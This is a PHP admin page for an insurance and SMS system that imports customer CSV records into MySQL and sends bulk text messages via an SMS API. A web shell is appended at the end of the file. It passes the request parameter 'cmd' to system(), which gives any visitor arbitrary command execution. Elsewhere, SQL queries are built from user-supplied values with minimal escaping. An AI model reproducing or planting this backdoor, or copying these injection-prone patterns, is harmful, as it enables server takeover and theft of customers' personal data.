<?php
/*
echo '<br> myadmin' . $_SESSION["myadmin"];
echo '<br> mycomputer' . $_SESSION["mycomputer"];
echo '<br> myservice' . $_SESSION["myservice"];
echo '<br> mymarketing' . $_SESSION["mymarketing"];
echo '<br> myinsurance' . $_SESSION["myinsurance"];
*/

	$myadmin = 'N';
	if(isset($_SESSION['myadmin']))
		if ($_SESSION['myadmin'] == 'Y')
			$myadmin = $_SESSION['myadmin'];		
	if(isset($_SESSION['myinsurance']))
		if ($_SESSION['myinsurance'] == 'Y')
			$myadmin = $_SESSION['myinsurance'];	

	$mystatus = '';	
	if(isset($_GET['mystatus']))
	{
		if ($_GET['mystatus'])
		{
			$mystatus = $_GET['mystatus'];
		}
	}
	//echo '<br> mystatus : ' . $mystatus;
	
	$mybox = '';	
	if(isset($_GET['mybox']))
	{
		if ($_GET['mybox'])
		{
			$mybox = $_GET['mybox'];
		}
	}
	//echo '<br> mybox : ' . $mybox;
	
	if ($mybox != 'add')
	{
		$myadmin = 'N';
	}	
		

	if ($myadmin == 'N')
	{
		include('body_account_not_found.php');
	}
	else
	{
		$insurance_user = $_SESSION["ulname"];
		$insurance_stamp = $globaldatetime;

	
		$mytag = '';	
		if(isset($_GET['mytag']))
		{
			if ($_GET['mytag'])
			{
				$mytag = $_GET['mytag'];
			}
		}			

		if ($mytag != 'POST') 
		{	
?>	
        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Insurance (Upload CSV File)</h1>
                </div>
                <!-- /.col-lg-12 -->
            </div>
			
			<div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
Basic Information
                        </div>
						
                        <div class="panel-body">
                            <div class="row">
                                <div class="col-lg-6">
<form name="import" method="post" enctype="multipart/form-data" action="index.php?body=insurance_upload_csv&mybox=add&mytag=POST">
	<div class="form-group">
		<label>Choose CSV File </label>
		<input class="form-control" type="file" name="file" />
		<br>
		<button type="submit" class="btn btn-default">Upload File</button>
		<button type="reset" class="btn btn-default">Reset</button>
	</div>
	
	<div class="form-group">
		<label>User Name / Time Stamp </label>
		<br>
		<?php print ("$insurance_user"); ?>
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
		<?php print ("$insurance_stamp"); ?>
	</div>
</form>		
								</div>
							</div>
						</div>
					</div>

					<div class="panel panel-default">
                        <div class="panel-heading">
CSV Data Contents
                        </div>
						
                        <div class="panel-body">
                            <div class="table-responsive">
                                <table class="table table-striped table-bordered table-hover">
                                    <thead>
                                        <tr>
                                            <th>#</th>
                                            <th>Field</th>
                                            <th>Sample Data</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <tr>
                                            <td>1</td>
                                            <td>Date to Send</td>
                                            <td>8/23/2016</td>
                                        </tr>
                                        <tr>
                                            <td>2</td>
                                            <td>SMS Code</td>
                                            <td>Yearly @ 17k/Monthly @ 3k</td>
                                        </tr>
                                        <tr>
                                            <td>3</td>
                                            <td>Customer No.</td>
                                            <td>153967</td>
                                        </tr>
                                        <tr>
                                            <td>3</td>
                                            <td>Customer Name</td>
                                            <td>JOSE RIZAL</td>
                                        </tr>
                                        <tr>
                                            <td>4</td>
                                            <td>Mobile No.</td>
                                            <td>0917-8888888</td>
                                        </tr>
                                        <tr>
                                            <td>5</td>
                                            <td>Status</td>
                                            <td>Open/Reminder/Overdue/Renew/Cancel</td>
                                        </tr>
                                    </tbody>
                                </table>
                            </div>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
						
					<div class="panel panel-default">
                        <div class="panel-heading">
Uploaded Data
                        </div>
						
                        <div class="panel-body">
                            <div class="table-responsive">
                                <table class="table table-striped table-bordered table-hover">
                                    <thead>
                                        <tr>
                                            <th>#</th>
                                            <th>Date</th>
                                            <th>Count</th>
                                            <th>Uploaded By</th>
                                            <th>Send Message</th>
                                        </tr>
                                    </thead>
                                    <tbody>

<?php
	$querydb  = "SELECT 
				 count(a.service_id) service_count,
				 a.service_send, a.service_user
			   FROM 
				 service_list a
			   GROUP BY
				 a.service_send, a.service_user
			   ORDER BY 
				 a.service_send, a.cuname
			   LIMIT 10 ";
	$resultdb = mysql_query($querydb);
	//echo mysql_error();
	$num_count = mysql_num_rows($resultdb);		
	//echo "<br> num_count " . $num_count;
	
	//fetch the results from the database
	$countdb = $countdb + 1;
	while ($rowdb =  mysql_fetch_array ($resultdb)) 
	{
		print("<tr class=\"odd gradeX\">");
	
		print("<td align=\"center\" valign=\"middle\">$countdb </td>\n");
		print("<td align=\"center\" valign=\"middle\">" .date('m/d/Y', strtotime($rowdb['service_send'])). "</td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[service_count] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[service_user] </td>\n");

		print("<td align=\"CENTER\" valign=\"middle\">");
?>		
<form name="update_status" role="form" method="post" action="index.php?body=service_upload_csv&mybox=add&mytag=BULK">

<?php 
	echo "<select class=\"form-control\" name=\"service_smsid\" > ";	
	
	if ($dlname != '') 
	{
		echo "<option value='" . $smsid .  "'>" . $smscode . "</option>";
	}
	else
	{
		echo "<option></option>";
	}
	
	$query = "SELECT a.smsid, a.smscode 
			  FROM sms_list a
			  ORDER BY smscode"; //Populate Vendor Dropdown
	$result = mysql_query($query);                            
	while($row = mysql_fetch_row($result))
	{
		echo "<option value='$row[0]'>$row[1]</option>";
	} 
	echo "</select>";
	mysql_query($query) or die('Error, insert query failed');  
?>

		<option></option>	
	</select>		
	<input type="hidden" name="mystatus" value="bulk" />
	<input type="hidden" name="service_send" value="<?php print ($rowdb['service_send']); ?>" />
	<input type="hidden" name="service_count" value="<?php print ($rowdb['service_count']); ?>" />
	<input type="hidden" name="service_user" value="<?php print ($rowdb['service_user']); ?>" />
	<button type="submit" class="btn btn-default">Send Bulk Text</button>
</form>			
<?php		
		print("</td>");

		print("</tr>");  
		$countdb = $countdb + 1;
	}  
?>		


                                    </tbody>
                                </table>
                            </div>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->						
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-6 -->
            </div>
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->
<?php
		}
		else
		if ($mytag == 'POST') 
		{
?>
		 <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
							<table width="100%">
								<tr>
									<td align="left">
                    <h1 class="page-header">Insurance (Upload in progress ...)</h1>
									</td>
									<td align="right">
<a title="Add a new batch?" href="index.php?body=insurance_upload_csv&mybox=add">
Upload Another Batch?
</a>
									</td>
								</tr>
							</table>
											
                </div>
                <!-- /.col-lg-12 -->
            </div>
						
			<div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
Basic Information
                        </div>
						
                        <div class="panel-body">
                            <div class="table-responsive">
                                <table class="table table-striped table-bordered table-hover">
                                    <thead>
                                        <tr>
                                            <th>#</th>
                                            <th>Customer No.</th>
                                            <th>Customer Name</th>
                                            <th>Mobile No.</th>
                                            <th>Status</th>
                                        </tr>
                                    </thead>
                                    <tbody>
<?php                                        	
	$file = $_FILES['file']['tmp_name'];
	if ($file == '')
	{
		print("<tr>\n");
		print("<td>***</td>\n");
		print("<td>***</td>\n");
		print("<td>***</td>\n");
		print("<td>***</td>\n");
		print("<td>*** NO FILE UPLOADED</td>\n");
		print("</TR>\n");  	
	}
	else
	{		
		$handle = fopen($file, "r");
		$mycount = 0;
		$loopcount = 0;
		while(($filesop = fgetcsv($handle, 1000, ",")) !== false)
		{
	
			//skip the first line				
			if ($loopcount > 0)
			{
				$mystring = $filesop[0];
				$mystring = str_replace("'", "&rsquo;", $mystring);
				$insurance_send = $mystring;
				
				if ($insurance_send != '')
				{
					$insurance_send = date("Y-m-d", strtotime($insurance_send));
				}
				
				$mystring = $filesop[1];
				$mystring = str_replace("'", "&rsquo;", $mystring);
				$insurance_type = $mystring;
	
				$mystring = $filesop[2];
				$mystring = str_replace("'", "&rsquo;", $mystring);
				$cucode = $mystring;
	
				$mystring = $filesop[3];
				$mystring = str_replace("'", "&rsquo;", $mystring);
				$cuname = $mystring;
													
				$mystring = $filesop[4];
				$mystring = str_replace("'", "&rsquo;", $mystring);
				$cumobile = $mystring;
	
				$mystring = $filesop[5];
				$mystring = str_replace("'", "&rsquo;", $mystring);
				$insurance_status = $mystring;
				
				$insurance_active = 'Y';
				$insurance_user = $_SESSION["ulname"];
				$insurance_stamp = $globaldatetime;
				
				if ($cucode == '')
				{
					print("<tr>\n");
					print("<td>&nbsp; $loopcount </td>\n");
					print("<td>$cucode</td>\n");
					print("<td>$cuname</td>\n");
					print("<td>$cumobile</td>\n");
					print("<td>*** NO CLIENT NUMBER</td>\n");
					print("</TR>\n");  				
				}
				else
				{
					//based on glenns sample,
					//we can already generate
					//the insurance for Appointment Table
					
					/*
					echo "<br> cucode " . $cucode;
					echo "<br> insurance_status " . $insurance_status;
					echo "<br> insurance_send " . $insurance_send;
					echo "<br> insurance_type " . $insurance_type;
					echo "<br> cumobile " . $cumobile;
					*/
					if (($cucode != '') && ($insurance_status != '') && ($insurance_send != '') && ($insurance_type != '') && ($cumobile != ''))
					{
						$insurance_id = 0;
						$insurance_date = $globaldate;
						//$insurance_send = ''; //already there
						
						//$cucode = ''; //already there
						$smscode = ''; 
						
						$insurance_mobile = $cumobile;
						//$insurance_type = ''; //already there
						$insurance_desc = '';
						//$insurance_status = ''; //already there
					
						$insurance_active = 'Y';
						$insurance_user = $_SESSION["ulname"];
						$insurance_stamp = $globaldatetime;
									
						//check if the record already exists
						$querysub = " SELECT *
								   FROM insurance_list 
								   WHERE cucode = '$cucode' and
								   		 insurance_send = '$insurance_send' and
										 insurance_type = '$insurance_type' ";
						$resultsub = mysql_query($querysub);
						echo mysql_error();				
						while ($rowsub =  mysql_fetch_array ($resultsub)) 
						{					
							$insurance_id = $rowsub[insurance_id];
							$insurance_active = $rowsub[insurance_active];
						}	
						
						if ($insurance_id == 0)
						{
$queryadd = 
"INSERT INTO insurance_list (
insurance_id,
insurance_date,
insurance_send,

cucode,
cuname,
smscode,

insurance_mobile,
insurance_type,
insurance_desc,
insurance_status,

insurance_active,
insurance_user,
insurance_stamp
) 
VALUES 
(
'$insurance_id',
'$insurance_date',
'$insurance_send',

'$cucode',
'$cuname',
'$smscode',

'$insurance_mobile',
'$insurance_type',
'$insurance_desc',
'$insurance_status',

'$insurance_active',
'$insurance_user',
'$insurance_stamp'
)";
							$status = 'ADD';					
						}
						else
						{
$queryadd = 
"UPDATE 
insurance_list
SET 
insurance_date = '$insurance_date',
insurance_send = '$insurance_send',

cucode = '$cucode',
cuname = '$cuname',
smscode = '$smscode',

insurance_mobile = '$insurance_mobile',
insurance_type = '$insurance_type',
insurance_desc = '$insurance_desc',
insurance_status = '$insurance_status',

insurance_active = '$insurance_active',
insurance_user = '$insurance_user',
insurance_stamp = '$insurance_stamp'
WHERE
insurance_id = '$insurance_id'";	
							$status = 'EDIT';					
						}
						mysql_query($queryadd) or die(mysql_error());   
						
						print("<tr>\n");
						print("<td>&nbsp; $loopcount </td>\n");
						print("<td>$cucode</td>\n");
						print("<td>$cuname</td>\n");
						print("<td>$cumobile</td>\n");
						print("<td>*** $status </td>\n");
						print("</TR>\n"); 												
					}	
					else
					{
						print("<tr>\n");
						print("<td>&nbsp; $loopcount </td>\n");
						print("<td>$cucode</td>\n");
						print("<td>$cuname</td>\n");
						print("<td>$cumobile</td>\n");
						print("<td>*** DATA INCOMPLETE</td>\n");
						print("</TR>\n");  	
					}				
				}
			}
			
			$loopcount = $loopcount + 1;
		}
	}						
?>												
                                    </tbody>
                                </table>
                            </div>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-6 -->
            </div>
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->
<?php
		}
		else
		if ($mytag == 'BULK') 
		{
?>
		 <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
							<table width="100%">
								<tr>
									<td align="left">
<h1 class="page-header">Bulk Text (Sending in progress ...)</h1>
									</td>
									<td align="right">
<a title="Add a new batch?" href="index.php?body=service_upload_csv&mybox=add">
Send another bulk text?
</a>
									</td>
								</tr>
							</table>
											
                </div>
                <!-- /.col-lg-12 -->
            </div>
						
			<div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
Message Sent : <strong><?php echo $service_smsdesc; ?></strong>
<?php 
/*
echo "<br> service_smsid " . $service_smsid;
echo "<br> service_smsdesc " . $service_smsdesc;
echo "<br> service_count " . $service_count;
echo "<br> service_send " . $service_send;
echo "<br> service_user " . $service_user;
*/
 ?>
                        </div>
						
                        <div class="panel-body">
                            <div class="table-responsive">
                                <table class="table table-striped table-bordered table-hover">
                                    <thead>
                                        <tr>
										<th>#</th>
										<th>Date to Send</th>
										<th>Customer Code </th>
										<th>Customer Name </th>
										<th>Mobile No.</th>
										<th>Status</th>
                                        </tr>
                                    </thead>
                                    <tbody>
<?php
	$querydb  = "SELECT 
				 a.* 
			   FROM 
				 service_list a
			   WHERE
			   	 a.service_send = '$service_send' and
				 a.service_active = 'Y'
			   ORDER BY 
				 a.service_send, a.cuname";
	$resultdb = mysql_query($querydb);
	//echo mysql_error();
	$num_count = mysql_num_rows($resultdb);		
	//echo "<br> num_count " . $num_count;
	
	//fetch the results from the database
	$countdb = $countdb + 1;
	while ($rowdb =  mysql_fetch_array ($resultdb)) 
	{
		print("<tr class=\"odd gradeX\">");
	
		print("<td align=\"center\" valign=\"middle\">$countdb </td>\n");
		print("<td align=\"center\" valign=\"middle\">" .date('m/d/Y', strtotime($rowdb['service_send'])). "</td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[cucode] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[cuname] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[service_mobile] </td>\n");
		print("<td align=\"left\" valign=\"middle\">\n");

		$send_id = 0;
		$send_date = $globaldate;
		$send_send = $globaldate;	
		$send_dept = $_SESSION["dltype"];
 		$send_name = $rowdb[cuname];
 		$send_mobile = $rowdb[service_mobile];
 		$send_desc = $service_smsdesc;
		
		$send_active = 'Y';
		$send_user = $_SESSION["ulname"];
		$send_stamp = $globaldatetime;

		if ($send_name == '') 
		{
			echo "Missing client name. <br> SMS Text Not Sent!";
		}
		else
		if ($send_mobile == '') 
		{
			echo "Missing mobile number. <br> SMS Text Not Sent!";
		}
		else
		if ($send_desc == '') 
		{
			echo "Missing message for client. <br> SMS Text Not Sent!";
		}
		else				
		{
			if ($_SESSION['semactive'] == 'Y')
			{
				$query_send = 
					"INSERT INTO send_text (
					send_id,
					send_date,
					send_send,

					send_dept,
					send_name,
					send_desc,
					send_mobile,
					
					send_active,
					send_user,
					send_stamp
					) 
					VALUES 
					(
					'$send_id',
					'$send_date',
					'$send_send',
					'$send_dept',
					'$send_name',
					'$send_desc',
					'$send_mobile',
					
					'$send_active',
					'$send_user',
					'$send_stamp'
					)";	
		
				mysql_query($query_send) or die(mysql_error());   
			
				if ($user != "root")
				{				
					$send_balance = 0;
					if ($_SESSION['semactive'] == 'Y')
					{
						// create a new cURL resource
						$ch = curl_init();
						
						// set URL and other appropriate options
						curl_setopt($ch, CURLOPT_URL, "http://api.semaphore.co/api/sms/account?api=" . $_SESSION['semapi'] );
						curl_setopt($ch, CURLOPT_HEADER, 0);
						curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						
						// grab URL and pass it to the browser
						//curl_exec($ch);
						$result = curl_exec ($ch) or die(curl_error($ch)); 
						echo curl_error($ch); 
						
						//echo "<br> print result ... " . $result; 
						
						$json = json_decode($result, true);
						
						//print_r("<br> print json ... " . $json);
						
						//output is ... {"status":"success","balance":87,"account_status":"Allowed"}
						//echo "<br> * status " . $json['status'];
						//echo "<br> * balance " . $json['balance'];
						//echo "<br> * account_status " . $json['account_status'];
						
						$send_balance = $json['balance'];
						
						// close cURL resource, and free up system resources
						curl_close($ch);
					}					
				
					if ($send_balance > 0) 
					{
						$fields = array();
						$fields["api"] = $_SESSION['semapi'];
						$fields["number"] = $send_mobile; //safe use 63
						$fields["message"] = $send_desc;
						$fields["from"] = $_SESSION['semsender'];
						$fields_string = http_build_query($fields);
						$outbound_endpoint = "http://api.semaphore.co/api/sms";
						$ch = curl_init();
						curl_setopt($ch, CURLOPT_URL, $outbound_endpoint);
						curl_setopt($ch,CURLOPT_POST, count($fields));
						curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);
						curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						$output = curl_exec($ch);
						curl_close($ch);
								
						echo "SMS Text Sent Successfully!";
					}
					else
					{
						echo "Record Not Sent. <br> SMS Balance Credit is empty!";				
					}
				}
				else
				{
					echo "Record Not Sent. <br> SMS Text was not sent due to ROOT account!";
				}		
			}
			else
			{
				echo "Record Not Sent. <br> SMS Text has been disabled!";
			}
		}	
		print("</td>\n");
	
		print("</tr>");  
		$countdb = $countdb + 1;
	}  
?>											
                                    </tbody>
                                </table>
                            </div>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-6 -->
            </div>
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->
<?php
		}		
	}
?>			<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>